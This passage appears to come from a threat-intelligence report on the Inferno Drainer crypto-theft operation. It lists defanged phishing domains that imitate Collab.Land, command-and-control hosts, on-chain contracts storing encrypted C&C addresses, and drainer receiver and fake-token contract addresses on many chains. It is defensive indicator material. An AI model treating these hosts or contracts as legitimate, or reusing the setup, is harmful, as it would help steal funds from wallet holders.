| **Domain**                                    | **Description** |
| --------------------------------------------- | --------------- |
| org.redirect-302[.]com                        | redirector      |
| roles-collab[.]com                            | redirector      |
| collab.land-wl[.]com                          | landing         |
| collab-layer0-land[.]com                      | landing         |
| collab-xlm-land[.]com                         | landing         |
| collab-dao-land[.]com                         | landing         |
| collab-mpc-land[.]com                         | landing         |
| collab-dash-land[.]com                        | landing         |
| collab-lands[.]com                            | landing         |
| collab-gn-land[.]com                          | landing         |
| collab-sol-land[.]com                         | landing         |
| collab.land-verifys[.]com                     | landing         |
| collab-asset-land[.]com                       | landing         |
| collabland-eth[.]com                          | landing         |
| collab.fork-land[.]com                        | landing         |
| sharp-dev-40d.ivx9ctza.workers[.]dev          | API (C&C)       |
| quick-net-6bd.cz53l1or.workers[.]dev          | API (C&C)       |
| mwpt9h-gc0d1q-shutter-88a0609b.koyeb[.]app    | API (C&C)       |
| njc21n-vi8z47-jaatcom822-eb36cf51.koyeb[.]app | API (C&C)       |
| dfuykhndfkhjdfnkdfhbdfkjhdbhkf[.]com          | API (C&C)       |
| jdfkgkgkfkjjkfkffdkfdkdfkdkdk[.]com           | API (C&C)       |
| kjnfdkjndsliurriuvlndvlijsndlij[.]com         | API (C&C)       |
| rhfhfhffgkllvfdklfvl[.]com                    | API (C&C)       |

## Appendix A: On-chain Configuration Storage Contracts Used by Inferno Drainer

| **Address**                                | **Network** | **Description**                                              |
| ------------------------------------------ | ----------- | ------------------------------------------------------------ |
| 0x158862Ec60B7934f1333e53AC1e148811A2E3BeB | BSC         | Dynamic configuration storage                                |
| 0xd24aeC3254652B0ab565E41A945b491e98Bb5FFC | BSC         | Drainer’s storage contract with encrypted C&C address        |
| 0x72cD63650700E5395f4aB238cecD18497A33a83e | BSC         | Drainer’s storage contract with obfuscated C&C address       |
| 0xe9d5f645f79fa60fca82b4e1d35832e43370feb0 | BSC         | Drainer’s storage contract with encrypted C&C, secureproxy version |

## Appendix B: Inferno Drainer Smart Contract Addresses in Different Chains

| **Chain ID** | **Network Name**        | **Receiver Contracts (transferContracts)** | **Fake Token Contracts (multiFunctionsContracts)** | **factoryContracts**                       |
| ------------ | ----------------------- | ------------------------------------------ | -------------------------------------------------- | ------------------------------------------ |
| 1            | Ethereum Mainnet        | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x000061cf8922f785d356f046b10b11431be60000         | 0xed0e416e0feea5b484ba5c95d375545ac2b60572 |
| 10           | Optimism                | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x0000bf98f6e5e3c0a9e0e35950973fcdb4650000         | 0x2f48e4cf013f8a8e5e1245f629100e6c6aeb2ba2 |
| 25           | Cronos Mainnet          | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0xcf6478b4b5e5a9f03d3e183f7a21c44b21f18669         | 0x343d61b74aa40fa17bc056feaf1726cb4f55d74d |
| 56           | BNB Smart Chain Mainnet | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x0000e3b1b91761bda3450c590d4ba4bbee750000         | 0xcdf11c5736e926b0a6c2148590d76979fe703c65 |
| 100          | Gnosis                  | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x0000d22b7d0d04c2c7338b17ce15256368b10000         | 0x10e7d285d05c3ba6c16ab7278f64c47f3a70bf95 |
| 122          | Fuse Mainnet            | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x0000b5389bca79ce22b3735069e571fcf6b70000         | 0xa42fd02e26a33b12fb429b37da4c154a28b4bd9d |
| 137          | Polygon Mainnet         | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x000003c12a4ad10c7bded360bc1836caa1000000         | 0x6bd779f8a92668139e19090d9b4e49b05bfa5774 |
| 146          | Sonic Mainnet           | 0x4a7f33e69dc73ec01c1d06216d22be06238781c1 | 0x00007ff020e216d2dc51bafc78fce36748010000         | 0xd705bce4504d2a81b71eaf53250ed46648274afa |
| 169          | Manta Pacific Mainnet   | 0x2558562c25357d9a381e0f11a9737703a6ccda9d | 0x00000d68043dc32d5dfdb10a11367dcd49040000         | 0xf249159d2b8d81292a0dee79ca24792f372afd72 |
| 250          | Fantom Opera            | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x00007e8edbbf57620946137f3f7249d388c20000         | 0x04286d3b07679408145a104e8d11fdecc88fccca |
| 252          | Fraxtal                 | 0x19e12a113a294ee5005d9c10bd2f04d2fd04b240 | 0x00003244125fa86c67d42db584dd48f9ab810000         | 0xa81f25db81efbf3a7eeaf19a4ff88f7e05914330 |
| 324          | zkSync Mainnet          | 0x24e1a6814d05a583aad62b1e1de5d1a5e71e7cb0 | 0xae3f25d83b4c23bb3c4f0964e2579c3ea33f79de         | 0xb8c6f0C2d957705D211f02A4012dFa3eDA32e1d6 |
| 369          | PulseChain              | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x00001f5c85ceb1b8896115c929159f9493350000         | 0x139ec2bd3fa0668e6e72485a56a8dad4489cd729 |
| 1101         | Polygon zkEVM           | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x0000a5f84281a0d056b0fd1ef743fc46b25a0000         | 0x791f719d393d893afdf96676aa345aad600dc037 |
| 1116         | Core Blockchain Mainnet | 0xa81f25db81efbf3a7eeaf19a4ff88f7e05914330 | 0x0000ccb844c538440bdde0db677c53b955fe0000         | 0x9d9451a9b1f9a2e427bcf4e56c9b49c483452332 |
| 4200         | Merlin Mainnet          | 0x4a7f33e69dc73ec01c1d06216d22be06238781c1 | 0x0000fb00a985cc0a34625d5ed85eb00ba80c0000         | 0xd705bce4504d2a81b71eaf53250ed46648274afa |
| 4337         | Beam                    | 0x4a7f33e69dc73ec01c1d06216d22be06238781c1 | 0x00009cb0264fcf11d2eec15c52cbf7fe210a0000         | 0xd705bce4504d2a81b71eaf53250ed46648274afa |
| 5000         | Mantle                  | 0x2b677d4f8a91b50c98e89e6adabd8a8baccdaf6b | 0x000044d174f865ba24778ed895970829f18d0000         | 0x19e12a113a294ee5005d9c10bd2f04d2fd04b240 |
| 8453         | Base                    | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x00008d8e710e4aa0c6abdadd4c71037420ee0000         | 0x563c770e1dddada7bd0f1dd14a020b6511388b8b |
| 33139        | ApeChain                | 0x4a7f33e69dc73ec01c1d06216d22be06238781c1 | 0x000017d9c79f809181f2e61b19e25110ced60000         | 0xd705bce4504d2a81b71eaf53250ed46648274afa |
| 34443        | Mode                    | 0x5af7791b2d570fbcc8eea706d911bf262833488f | 0x000002ced721182f298d5ddb7f11380cff6f0000         | 0x3952060fc153987053afd082971ec0e4b2e5cba6 |
| 42161        | Arbitrum One            | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x000056c1834d4fa05451c5478769706ba5a90000         | 0x9448803c95bad8f89fadf787dc0f43597d8f9e39 |
| 42220        | Celo Mainnet            | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x00002b1b4354b423e9f5cd99eae73dbff9000000         | 0xa5e01fbf36e37ea414fa455a8fe29799b7e5feaa |
| 43114        | Avalanche C-Chain       | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x000029cc641598ae3f6fce3b6037cd1be9040000         | 0x3d89d6d8b37e797088ad37061debf894c12b9a1d |
| 59144        | Linea                   | 0x19e12a113a294ee5005d9c10bd2f04d2fd04b240 | 0x00007b7fdaf5939f11e7ced13da211b59d960000         | 0xafb6997b20581b1e82d0c70eba606ad9f20d54d0 |
| 80094        | Berachain               | 0xd705bce4504d2a81b71eaf53250ed46648274afa | 0x00006ddb2d2f8561e0347d997fac0bbaf3310000         | 0xa81f25db81efbf3a7eeaf19a4ff88f7e05914330 |
| 81457        | Blast                   | 0x19e12a113a294ee5005d9c10bd2f04d2fd04b240 | 0x00001a6e6534dcf8e8feb4d7ab13dd6209160000         | 0xafb6997b20581b1e82d0c70eba606ad9f20d54d0 |
| 167000       | Taiko Alethia           | 0x4a7f33e69dc73ec01c1d06216d22be06238781c1 | 0x000082988042bd4449d5863801c0e9b490190000         | 0xa81f25db81efbf3a7eeaf19a4ff88f7e05914330 |
| 534352       | Scroll                  | 0x4a7f33e69dc73ec01c1d06216d22be06238781c1 | 0x0000f6d1de52b4dd8b1e2b73becde6dc8d530000         | 0xc5ce3568e4a265749278edd8ce44dfb763981ffe |
| 810180       | zkLink Nova Mainnet     | 0x7855c9673fdb286218b00e13903ab2e06486a9b4 | 0xb8c6f0c2d957705d211f02a4012dfa3eda32e1d6         | 0xb056c4b21285fc9f66a6728802b8438acbcd9cce |
| 666666666    | Degen Chain             | 0x4a7f33e69dc73ec01c1d06216d22be06238781c1 | 0x00005cb3af851a42d3555fb10e7bcadc8d3b0000         | 0x22db9e3f3605844e028acd18019b3a8c49a75da7 |
| 1313161554   | Aurora Mainnet          | 0x000037bb05b2cef17c6469f4bcdb198826ce0000 | 0x000027ba3b15d36fbd30b0fbec9b145a1f800000         | 0x000027ba3b15d36fbd30b0fbec9b145a1f800000 |